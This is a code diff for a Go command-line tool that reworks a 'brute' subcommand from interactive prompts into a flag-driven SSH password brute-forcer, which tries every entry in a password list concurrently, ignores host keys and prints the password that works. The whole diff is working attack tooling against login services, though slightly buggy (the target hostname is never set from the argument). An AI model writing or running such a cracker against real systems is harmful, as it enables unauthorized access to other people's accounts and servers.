@@ -18,168 +18,111 @@ package cmd
 import (
 	"errors"
 	"fmt"
-	"io/fs"
-	"io/ioutil"
 	"os"
-	"strconv"
 	"strings"
+	"sync"
 
-	"github.com/AlecAivazis/survey/v2"
 	"github.com/fatih/color"
 	"github.com/go-ping/ping"
 	"github.com/spf13/cobra"
+	"golang.org/x/crypto/ssh"
 )
 
 // bruteCmd represents the brute command
 type response struct {
 	Hostname string
 	Service  string
-	Confirm  int
 	Port     int
 	Username string
 	ListPath string
 }
 
 var answers = response{}
-var port string
-var qs = []*survey.Question{
-	{
-		Name:   "hostname",
-		Prompt: &survey.Input{Message: "who are we cracking today?"},
-		Validate: func(ans interface{}) error {
-			// check if the hostname is invalid
-			if str, ok := ans.(string); !ok {
-				return errors.New(color.RedString("invalid hostname"))
-			} else if _, ok := ping.NewPinger(str); ok != nil {
-				return errors.New(color.RedString("invalid hostname"))
-			}
-			return nil
-		},
-		Transform: survey.ToLower,
-	},
-	{
-		Name: "service",
-		Prompt: &survey.Select{
-			Message: "what service are we attacking?",
-			Options: []string{"http", "ssh", "ftp"},
-			Default: "ssh",
-		},
-	},
-}
 
 var bruteCmd = &cobra.Command{
 	Use:   "brute",
 	Short: "crack a password",
+	Args: func(cmd *cobra.Command, args []string) error {
+		if len(args) != 1 {
+			return errors.New(color.RedString("expected 1 argument, got " + fmt.Sprint(len(args))))
+		}
+		if _, err := ping.NewPinger(args[0]); err != nil {
+			return errors.New(color.RedString("invalid hostname"))
+		}
+		if answers.Service == "" {
+			return errors.New(color.RedString("need the service to brute force"))
+		}
+		return nil
+	},
 	RunE: func(cmd *cobra.Command, args []string) error {
+		if answers.Port == 0 { //! u was here
+			switch s := answers.Service; s {
+			case "http":
+				answers.Port = 80
+			case "ssh":
+				answers.Port = 22
+			case "ftp":
+				answers.Port = 21
+			}
+		}
+		passwords, err := readFile(answers.ListPath)
+		if err != nil {
+			return errors.New(color.RedString(err.Error()))
+		}
+		wg := sync.WaitGroup{}
+		s := strings.Split(args[0], "@")
+		if len(s) == 2 {
+			answers.Username = s[0]
+		}
 
-		err := survey.Ask(qs, &answers)
-		if err != nil {
-			return errors.New(color.RedString(err.Error()))
-		}
-		switch s := answers.Service; s {
-		case "http":
-			port = "80"
+		// brute force
+		switch answers.Service {
 		case "ssh":
-			port = "22"
-		case "ftp":
-			port = "21"
-		}
-		var qs2 = []*survey.Question{
-			{
-				Name: "port",
-				Prompt: &survey.Input{
-					Message: "what port should I use for the attack?",
-					Default: port,
-				},
-				Validate: func(ans interface{}) error {
-					_, err := strconv.Atoi(ans.(string))
-					return err
-				},
-				Transform: func(ans interface{}) (newAns interface{}) {
-					p, _ := strconv.Atoi(ans.(string))
-					return p
-				},
-			},
-			{
-				Name: "username",
-				Prompt: &survey.Input{
-					Message: "what username are we cracking?",
-				},
-			},
-			{
-				Name: "listpath",
-				Prompt: &survey.Input{
-					Message: "where's the password list located?",
-					Suggest: func(toComplete string) []string {
-						var dir []fs.FileInfo
-						var err error
-						var path []string
-						if toComplete == "" {
-							dir, err = ioutil.ReadDir(".")
+			wg.Add(len(passwords))
+			for _, pass := range passwords {
+				sshConfig := &ssh.ClientConfig{
+					User: answers.Username,
+					Auth: []ssh.AuthMethod{ssh.Password(pass)},
+				}
+				sshConfig.HostKeyCallback = ssh.InsecureIgnoreHostKey()
+				go func(p string) {
+					defer wg.Done()
+					client, err := ssh.Dial("tcp", answers.Hostname+":"+fmt.Sprint(answers.Port), sshConfig)
+					if err != nil {
+						if strings.Contains(err.Error(), "unable to authenticate") {
+							fmt.Println(color.RedString("[-] ") + "tried " + color.CyanString(p))
+							return
 						} else {
-							dir, err = ioutil.ReadDir(strings.Split(toComplete, "/")[0])
-							dirstr := strings.Split(toComplete, "/")[0]
-							path = strings.Split(toComplete, "/")
-							fmt.Println(dirstr)
+							color.Red(err.Error())
 						}
-						// fmt.Println(fmt.Sprint(len(dir)))
-						if err != nil {
-							return nil
-						}
-						var suggestions []string
-						for _, item := range dir {
-							if toComplete == "" {
-								if item.IsDir() {
-									suggestions = append(suggestions, item.Name() + "/")
-								} else {
-									suggestions = append(suggestions, item.Name())
-								}
-							} else if strings.Contains(item.Name(), path[1]) {
-								if item.IsDir() {
-									suggestions = append(suggestions, item.Name() + "/")
-								} else {
-									suggestions = append(suggestions, item.Name())
-								}
-							}
-						}
-						return suggestions
-					},
-				},
-				Validate: func(ans interface{}) error {
-					str := ans.(string)
-					if !fs.ValidPath(str) {
-						return errors.New(color.RedString("invalid filepath!"))
 					}
-					file, err := os.Stat(str)
-					if file == nil || file.IsDir() {
-						return errors.New(color.RedString("invalid filepath!"))
+					if client != nil {
+						err = client.Close()
 					}
-					return err
-				},
-			},
-			{
-				Name: "confirm",
-				Prompt: &survey.Select{
-					Message: "ready?",
-					Options: []string{color.RedString("[x] no i'm baby"), color.GreenString("[+] let's goooo")},
-				},
-			},
+					if err == nil {
+						fmt.Println(color.GreenString("[+] ") + "correct password is " + color.CyanString(p))
+						os.Exit(0)
+					}
+				}(pass)
+
+			}
 		}
-		err = survey.Ask(qs2, &answers)
-		if err != nil {
-			return errors.New(color.RedString(err.Error()))
-		}
-		if answers.Confirm == 0 { // index of the options list above
-			fmt.Println(color.CyanString("[i] ") + "canceled")
-			return nil
-		}
-		
+		wg.Wait()
 		return nil
 	},
 }
 
 func init() {
 	rootCmd.AddCommand(bruteCmd)
+	bruteCmd.Flags().StringVarP(&answers.Service, "service", "s", "", "the service to brute force, accepted values are ftp, http, and ssh")
+	bruteCmd.Flags().StringVarP(&answers.Username, "username", "u", "", "the username of the user to attempt to login to")
+	bruteCmd.Flags().IntVarP(&answers.Port, "port", "p", 0, "the port the service is running on")
+	bruteCmd.Flags().StringVarP(&answers.ListPath, "passwords", "P", "", "list of passwords to try (required)")
+	bruteCmd.Flags().Lookup("port").Usage = "the port to brute force (required)"
+	bruteCmd.Flags().Lookup("username").Usage = "the username of the user to attempt to login to"
+	bruteCmd.Flags().Lookup("service").Usage = "the service to brute force, accepted values are ftp, http, and ssh"
+
+	bruteCmd.Hidden = true // wip
 	// Here you will define your flags and configuration settings.
 
 	// Cobra supports Persistent Flags which will work for this command
